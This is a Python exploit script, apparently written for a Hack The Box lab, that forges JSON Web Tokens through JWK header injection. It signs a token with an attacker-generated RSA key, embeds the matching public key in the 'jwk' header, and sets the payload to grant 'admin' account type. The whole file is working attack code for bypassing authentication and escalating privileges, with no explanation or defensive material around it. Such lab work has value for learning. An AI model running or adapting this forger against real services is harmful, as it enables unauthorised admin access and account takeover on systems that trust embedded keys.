from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import jwt
import logging
import json
from typing import Dict, Any
from pathlib import Path

class JWTForger:
    def __init__(self, public_key_path: str, private_key_path: str):
        """Initialize the JWT Forger with key paths"""
        self.public_key_path = Path(public_key_path)
        self.private_key_path = Path(private_key_path)
        
        # Configure logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def _read_key_file(self, file_path: Path) -> bytes:
        """Safely read a key file"""
        try:
            with open(file_path, 'rb') as f:
                return f.read()
        except FileNotFoundError:
            self.logger.error(f"Key file not found: {file_path}")
            raise
        except IOError as e:
            self.logger.error(f"Error reading key file: {e}")
            raise

    def _get_public_key_components(self) -> Dict[str, Any]:
        """Extract public key components for JWK"""
        try:
            public_key_pem = self._read_key_file(self.public_key_path)
            public_key = serialization.load_pem_public_key(
                public_key_pem,
                backend=default_backend()
            )
            numbers = public_key.public_numbers()
            
            # Convert to base64url encoding
            from base64 import urlsafe_b64encode
            def int_to_base64(value):
                value_hex = format(value, 'x')
                # Ensure even length
                if len(value_hex) % 2 == 1:
                    value_hex = '0' + value_hex
                value_bytes = bytes.fromhex(value_hex)
                return urlsafe_b64encode(value_bytes).decode('utf-8').rstrip('=')

            return {
                "kty": "RSA",
                "n": int_to_base64(numbers.n),
                "e": int_to_base64(numbers.e),
                "alg": "RS256",
            }
        except Exception as e:
            self.logger.error(f"Error extracting public key components: {e}")
            raise

    def forge_token(self, payload: Dict[str, Any]) -> str:
        """Create a forged JWT with custom payload"""
        try:
            jwk_dict = self._get_public_key_components()
            private_key_pem = self._read_key_file(self.private_key_path)
            
            self.logger.info(f"Forging JWT with payload: {payload}")
            token = jwt.encode(
                payload,
                private_key_pem,
                algorithm='RS256',
                headers={'jwk': jwk_dict}
            )
            self.logger.info("JWT successfully forged")
            return token
            
        except Exception as e:
            self.logger.error(f"Error forging token: {e}")
            raise

    def verify_token(self, token: str) -> bool:
        """Verify the forged token"""
        try:
            public_key_pem = self._read_key_file(self.public_key_path)
            decoded = jwt.decode(
                token,
                public_key_pem,
                algorithms=['RS256']
            )
            self.logger.info("Token verification successful")
            return True
        except jwt.InvalidTokenError as e:
            self.logger.error(f"Token verification failed: {e}")
            return False

def main():
    # Configuration
    PUBLIC_KEY_PATH = 'exploit_public.pem'
    PRIVATE_KEY_PATH = 'exploit_private.pem'
    PAYLOAD = {
    "user": "htb-stdnt",
    "accountType": "admin",
    "id": 1,
    "iat": 1740685844
    }

    try:
        # Create forger instance
        forger = JWTForger(PUBLIC_KEY_PATH, PRIVATE_KEY_PATH)
        
        # Forge token
        token = forger.forge_token(PAYLOAD)
        print("\nForged Token:")
        print(token)
        
        # Verify token
        if forger.verify_token(token):
            print("\nToken verification successful")
            
            # Display decoded token parts
            header, payload, signature = token.split('.')
            # Decode and pad base64url string
            def decode_base64url(s):
                pad = '=' * (4 - len(s) % 4)
                return json.loads(jwt.utils.base64url_decode(s + pad))
            
            print("\nToken Details:")
            print(f"Header: {decode_base64url(header)}")
            print(f"Payload: {decode_base64url(payload)}")
            
    except Exception as e:
        logging.error(f"Main execution failed: {e}")
        raise

if __name__ == "__main__":
    main()